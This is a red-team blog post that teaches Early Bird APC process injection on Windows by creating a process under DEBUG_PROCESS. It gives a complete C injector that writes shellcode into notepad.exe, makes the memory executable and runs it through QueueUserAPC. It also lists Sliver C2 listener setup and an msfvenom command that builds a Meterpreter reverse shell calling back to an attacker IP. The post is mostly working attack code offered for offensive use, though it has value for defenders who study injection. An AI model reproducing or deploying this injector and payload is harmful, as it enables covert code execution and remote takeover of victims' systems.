---
title: Offensive C - QueueUserAPC (Early Bird APC Injection)
author: nirajkharel
date: 2025-06-21 14:10:00 +0800
categories: [Red Teaming, Offensive Programming]
tags: [Red Teaming, Offensive Programming]
render_with_liquid: false
---


I have already discussed about Early Bird APC Injection using **QueueUserAPC** method [on this blog.](https://nirajkharel.com.np/posts/process-injection-shellcode-queuUserApc/) On a high level, with respect to the old method, we start by creating a suspended process example Notepad.exe, which pauses its execution. This lets us get a handle to the process and its threads. We then allocate memory using **VirtualAlloc** and inject our shellcode with **WriteProcessMemory**. Instead of **CreateRemoteThread**, we use **QueueUserAPC** to queue the shellcode on the main thread. Finally, calling **ResumeThread** triggers the APC, executing our code before the main thread runs.

But in this blog, we are going to explore a different technique to perform Early Bird APC Injection using the **DEBUG_PROCESS** flag instead of **CREATE_SUSPENDED**. Here we wil be using **CreateProcess** to create a process with **DEBUG_PROCESS** flag in which the local process would work as the debugger for the target/created process. Creating a process on the debugger mode will pause the execution and waits for the debugger to resume execution. Normally, APCs execute only when a thread enters an alertable state. However, in Early Bird APC, this requirement is bypassed because the thread hasn’t started and allows the queued shellcode to execute immediately upon detaching the debugger.

Common methods like **VirtualAlloc**, **WriteProcessMemory**, and **VirtualProtect** are used to inject shellcode into the target process's memory. The shellcode is then queued for execution using **QueueUserAPC**, which schedules it to run in the context of a thread. Once the local process, working as a debugger detaches from the remote process, the remote process resumes, and the queued APC executes the malicious shellcode.

We'll set up the C2 server to listen for incoming connections and generate shellcode using msfvenom. For this demo, we’re skipping shellcode obfuscation or encryption since it's covered in a previous blog, and real-time protection is disabled.

## Shellcode Generation and C2 Listener.
The shellcode generation and listening for the connection on the Sliver C2 is same as what we did on the previous blog.         

```bash
# Creating a profile on the C2
profiles new beacon --mtls 192.168.1.86:443 --format shellcode shellcode-beacon

# Creating a stage listener on port 8080. This listener delivers staged payloads and start the mTLS C2 server on host 192.168.1.86 and port 443.
stage-listener -u tcp://192.168.1.86:8080 -p shellcode-beacon

mtls -L 192.168.1.86 -l 443

# Generating the shellcode using msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.86 LPORT=8080 -f c
```

## Process Creation
As discussed earlier, we would start by creating process on the **DEBUG_PROCESS** mode. The **CreateProcess** method contains different arguments which has been described already on [one of my blog here](https://nirajkharel.com.np/posts/process-injection-shellcode-queuUserApc/#createprocess). One thing that I want to discuss here is **dwCreationFlags** which is responsible for configuring how the process would be created, on this case, we would be passing **DEBUG_PROCESS** value.

```c
// CreateProcess Variables
STARTUPINFO si;
PROCESS_INFORMATION pi;

ZeroMemory( &si, sizeof(si) );
si.cb = sizeof(si);
ZeroMemory( &pi, sizeof(pi) );

// It could be any application here
LPCWSTR execFile = L"C:\\Windows\\notepad.exe";
   
// CreateProcess in DEBUG State
BOOL bCreateProcess = CreateProcess(execFile, NULL, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &si, &pi);

if (bCreateProcess == FALSE) {
    printf("\nError Creating the Process: %d", GetLastError());
    return;
}

printf("Successfully created the process in Debug state\n");
```

## Shellcode Injection
Next step would be to use **[VirtualAlloc](https://nirajkharel.com.np/posts/process-injection-shellcode/#buffer-allocation---virtualallocex)** to allocate the buffer into the virtual address space of the debug process. 
```c
DWORD dwOldProtection = NULL;
HANDLE hProcess = pi.hProcess;
SIZE_T dwSize = sizeof(Payload);
SIZE_T sNumberOfBytesWritten = NULL;

PVOID lpAlloc = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

if (lpAlloc == NULL) {
    printf("\nError Allocating the memory: %d", GetLastError());
    return;
}
printf("Successfully allocated memory at: 0x%p \n",lpAlloc);
```

Once the allocation is done, we need to write the payload into the allocated memory using **[WriteProcessMemory](https://nirajkharel.com.np/posts/process-injection-shellcode/#write-buffer-into-the-allocated-memory---writeprocessmemory)** method.
```c
BOOL bWriteBuffer = WriteProcessMemory(hProcess, lpAlloc, Payload, dwSize, &sNumberOfBytesWritten);

if (bWriteBuffer == FALSE){
  		printf("Failed to Write Memory to the process\n");
  		CloseHandle(hProcess);
  		return;
  	}

printf("Successfully written %d Bytes\n", sNumberOfBytesWritten);
```

After writing the payload into the buffer, we need to make the change on the permission of the memory to execute the payload which is done via **[VirtualProtectEx](https://nirajkharel.com.np/posts/process-injection-shellcode-queuUserApc/#virtualprotectex)**
```c
if (!VirtualProtectEx(hProcess, lpAlloc, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
	printf("Failed to change memory protection from RW to RX: %d \n", GetLastError());
	return FALSE;
}
```

## QueueUserAPC
At this point, the process is paused in a debug state, with shellcode already written into its allocated memory. Each thread in a process has an APC (Asynchronous Procedure Call) queue. By using **[QueueUserAPC](https://nirajkharel.com.np/posts/process-injection-shellcode-queuUserApc/#queueuserapc)**, we queue our shellcode to the target thread’s APC queue. When the debugger detaches and the process resumes, the system executes the queued shellcode before the thread’s original code, effectively hijacking execution flow.

The **QueueUserAPC** method contains three arguments which are **pfnAPC**, **hThread** and **dwData**. The argument **dwData** is not important as we are not passing any additional parameter to the function, it can be configured as NULL. The parameter **pfaAPC** provides pointer to the APC function, we would be passing **lpAlloc** as the function to be executed when the thread is resumed and **hThread** is a handle to the thread to which the APC will be queued.
```c
DWORD dQueueAPC = QueueUserAPC((PTHREAD_START_ROUTINE) lpAlloc, pi.hThread, NULL);
if (dQueueAPC == 0) {
    printf("\nError Queueing APC: %d", GetLastError());
    return;
}
```

## Detach the Debugger Process
Now, once we have our APC function queued on our thread, the next step is to detach the debugger process from the remote process so that the remote process can resume its execution. This can be done using **DebugActiveProcessStop** method and contains a single parameter **dwProcessId** which is the process Id of the remote process.
```c
DebugActiveProcessStop(Pi.dwProcessId);

// Close the handle once the program is exited
printf("Press Enter to Quit...");
getchar();
CloseHandle(hProcess);
CloseHandle(hThread);
```
Which makes our full code as:
```c
#include <Windows.h>
#include <stdio.h>

// payload
unsigned char Payload[] =
"\xfc\x48\x[.....snip.....]]xff\xd5";


int main() {
	// CreateProcess Variables
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// It could be any application here
	LPCWSTR execFile = L"C:\\Windows\\notepad.exe";

	// CreateProcess in DEBUG State
	BOOL bCreateProcess = CreateProcess(execFile, NULL, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &si, &pi);

	if (bCreateProcess == FALSE) {
		printf("\nError Creating the Process: %d", GetLastError());
		return;
	}

	printf("Successfully created the process in Debug state\n");

	DWORD dwOldProtection = NULL;
	HANDLE hProcess = pi.hProcess;
	HANDLE hThread = pi.hThread;
	SIZE_T dwSize = sizeof(Payload);
	SIZE_T sNumberOfBytesWritten = NULL;

	PVOID lpAlloc = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (lpAlloc == NULL) {
		printf("\nError Allocating the memory: %d", GetLastError());
		return -1;
	}
	printf("Successfully allocated memory at: 0x%p \n", lpAlloc);

	BOOL bWriteBuffer = WriteProcessMemory(hProcess, lpAlloc, Payload, dwSize, &sNumberOfBytesWritten);

	if (bWriteBuffer == FALSE) {
		printf("Failed to Write Memory to the process\n");
		CloseHandle(hProcess);
		return -1;
	}

	printf("Successfully written %d Bytes\n", sNumberOfBytesWritten);

	if (!VirtualProtectEx(hProcess, lpAlloc, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("Failed to change memory protection from RW to RX: %d \n", GetLastError());
		return -1;
	}

	DWORD dQueueAPC = QueueUserAPC((PTHREAD_START_ROUTINE)lpAlloc, hThread, NULL);
	if (dQueueAPC == 0) {
		printf("\nError Queueing APC: %d", GetLastError());
		return -1;
	}

	DebugActiveProcessStop(pi.dwProcessId);

	// Close the handle once the program is exited
	printf("Press Enter to Quit...");
	getchar();
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return 0;
}
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-early-bird-apc.png">

#### References
- [https://maldevacademy.com/](https://maldevacademy.com/)
- [https://chrollo-dll.gitbook.io/chrollo/security-blogs/malware-development-and-ttps/early-bird-apc-injection-t1055.004](https://chrollo-dll.gitbook.io/chrollo/security-blogs/malware-development-and-ttps/early-bird-apc-injection-t1055.004)
- [https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugactiveprocessstop](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugactiveprocessstop)
- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc/](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)